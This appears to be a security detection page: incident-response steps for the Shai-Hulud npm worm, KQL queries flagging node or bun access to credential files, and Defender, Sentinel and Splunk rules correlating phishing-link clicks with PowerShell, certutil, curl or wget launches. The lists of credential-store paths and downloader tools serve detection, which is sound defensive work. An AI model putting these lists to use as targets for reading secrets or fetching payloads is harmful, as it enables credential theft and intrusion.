1) TRIAGE: Correlate the credential access with a preceding 'node setup.mjs' / Bun execution on the same host in the same window; if present, escalate immediately. Enumerate exactly which credential stores were touched. 2) CONTAIN: Isolate the host/runner. Remove the token-revocation watcher first (per SafeDep), then rotate every credential resolvable from that machine — npm, GitHub, cloud (AWS/GCP/Azure), Vault, kube, DB and SSH keys — and invalidate active sessions. 3) HUNT: Check for outbound exfil, creation of a 'Shai-Hulud: Here We Go Again' GitHub repo under stolen tokens, and unexpected npm publish events from the compromised identity.
DeviceFileEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("node","node.exe","bun","bun.exe")
| where (FolderPath has "\\.aws\\" or FolderPath has "/.aws/" or FolderPath has "\\.kube\\" or FolderPath has "/.kube/" or FolderPath has "\\.config\\gh\\" or FolderPath has "/.config/gh/")
   or FileName in~ (".git-credentials",".vault-token","id_rsa","id_ed25519",".netrc")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where ActingProcessName has_any ("node","bun")
| where TargetFilePath has_any ("/.aws/credentials","\\.aws\\credentials","/.kube/config","\\.kube\\config",".vault-token",".git-credentials","/.config/gh/hosts.yml","id_rsa","id_ed25519",".netrc")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, EventType
| order by TimeGenerated desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
